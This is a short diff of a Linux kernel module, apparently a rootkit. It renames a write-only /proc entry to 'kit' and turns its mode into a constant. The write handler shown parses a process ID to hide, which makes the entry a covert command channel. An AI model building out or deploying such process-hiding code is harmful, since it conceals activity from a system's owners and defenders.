@@ -15,12 +15,11 @@
 // based on http://stackoverflow.com/questions/8516021/proc-create-example-for-kernel-module
 
 // Constants
-#define PARENT_PROC_ENTRY NULL
+#define PARENT_PROC_ENTRY  NULL
+#define PROC_ENTRY_MODE    0222
 
 //TODO: rename this
-static const char *PROC_FILE_NAME = "proc_file_name";
-
-mode_t mode = 0222; // write only
+static const char *PROC_FILE_NAME = "kit";
 
 // Function prototyps
 static ssize_t receiveWrite(struct file *, const char __user *, size_t, loff_t *);
@@ -41,7 +40,7 @@ static const struct file_operations proc_file_fops = {
 
 
 int communication_init(void) {
-	proc_file_entry = proc_create(PROC_FILE_NAME, mode, PARENT_PROC_ENTRY, &proc_file_fops);
+	proc_file_entry = proc_create(PROC_FILE_NAME, PROC_ENTRY_MODE, PARENT_PROC_ENTRY, &proc_file_fops);
 
 	if (proc_file_entry == NULL) {
 		return -ENOMEM;
@@ -73,7 +72,7 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 	kernelBuffer[len] = '\0';
 
 	printInfo("%s", kernelBuffer);
-
+   
 	//
 	//int pidToHide = atoi(kernelBuffer);
 	int pidToHide;
